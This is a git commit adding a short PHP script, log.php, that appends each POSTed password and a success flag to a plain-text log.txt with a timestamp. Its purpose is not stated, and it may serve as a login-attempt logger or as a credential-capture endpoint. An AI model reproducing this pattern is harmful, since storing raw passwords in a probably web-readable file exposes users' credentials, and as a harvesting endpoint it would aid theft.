9dec39ebbbbba025c38ca78f657c4cf39806566f
alizghal <azghal.pro@gmail.com>
2025-03-11 23:45:30 +0100

    Update log.php

--- log.php
+++ log.php
@@ -1,1 +1,10 @@
-
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $password = $_POST["password"];
+    $success = $_POST["success"];
+    $timestamp = date("Y-m-d H:i:s");
+    
+    $log_entry = "$timestamp - Tentative: $password - Status: $success\n";
+    file_put_contents("log.txt", $log_entry, FILE_APPEND);
+}
+?>
